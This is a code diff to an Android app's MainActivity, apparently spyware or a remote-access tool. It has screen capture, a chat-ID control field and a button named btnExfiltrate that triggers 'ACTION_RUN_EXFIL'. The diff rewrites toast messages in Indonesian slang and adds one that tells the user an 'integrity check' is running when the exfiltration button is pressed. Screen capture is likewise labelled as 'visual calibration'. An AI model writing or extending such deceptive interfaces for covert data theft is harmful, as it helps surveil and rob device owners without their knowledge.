@@ -22,7 +22,7 @@ class MainActivity : AppCompatActivity() {
     private val projectionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
         if (result.resultCode == RESULT_OK && result.data != null) {
             screenshotCapture.startCapture(result.resultCode, result.data!!)
-            Toast.makeText(this, "Visual Calibration Started...", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Kalibrasi Visual OTW...", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -52,7 +52,7 @@ class MainActivity : AppCompatActivity() {
             val chatId = binding.etChatId.text.toString()
             if (chatId.isNotEmpty()) {
                 startCoreServices(chatId, null)
-                Toast.makeText(this, "Modules Synced", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Modul Udah Konek, gng!", Toast.LENGTH_SHORT).show()
             }
         }
 
@@ -94,6 +94,7 @@ class MainActivity : AppCompatActivity() {
 
         binding.btnExfiltrate.setOnClickListener {
             startCoreServices(binding.etChatId.text.toString(), "ACTION_RUN_EXFIL")
+            Toast.makeText(this, "Cek Integritas OTW...", Toast.LENGTH_SHORT).show()
         }
 
         binding.btnSettings.setOnClickListener {
